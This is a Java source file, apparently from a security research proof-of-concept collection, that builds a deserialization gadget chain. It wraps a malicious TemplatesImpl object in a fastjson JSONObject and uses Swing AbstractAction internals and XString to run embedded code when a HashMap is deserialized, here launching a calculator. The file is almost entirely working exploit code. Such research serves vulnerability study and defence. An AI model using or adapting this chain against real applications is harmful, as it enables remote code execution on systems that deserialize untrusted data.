package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;

public class AbstractTemplatesRefbypassChain {
    public static void main(String[] args) throws Exception{
        Templates templates = SerializeUtils.getTemplate("calc");
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("pop", templates);
        XString xstr = new XString("");
        StyledEditorKit.AlignmentAction action = SerializeUtils.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
        SerializeUtils.setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));
        action.putValue("p1", "");
        action.putValue("p2", "");
        Field tablefield = AbstractAction.class.getDeclaredField("arrayTable");
        tablefield.setAccessible(true);
        Object atable = tablefield.get(action);
        Field tablefield1 = atable.getClass().getDeclaredField("table");
        tablefield1.setAccessible(true);
        Object[] table1 = (Object[])tablefield1.get(atable);
        table1[1] = xstr;
        table1[3] = jsonObject;
        tablefield1.set(atable, table1);
        HashMap<Object, Object> map = new HashMap<>();
        map.put(templates,action);
        SerializeUtils.deserTester(map);
    }
}
